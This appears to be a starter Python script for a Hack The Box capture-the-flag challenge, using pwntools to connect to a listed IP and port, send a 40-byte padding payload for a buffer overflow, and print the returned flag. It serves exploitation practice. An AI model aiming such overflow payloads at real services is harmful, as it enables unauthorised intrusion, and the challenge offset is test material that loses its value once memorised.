#!/usr/bin/python3.8

'''
You need to install pwntools to run the script.
To run the script: python3 ./wrapper.py
'''

# Library
from pwn import *

# Open connection
IP   = '154.57.164.69' # Change this
PORT = 32844      # Change this

r    = remote(IP, PORT)

offset = 40
# Craft payload
payload = b'A' * offset # Change the number of "A"s

# Send payload
r.sendline(payload)

# Read flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')

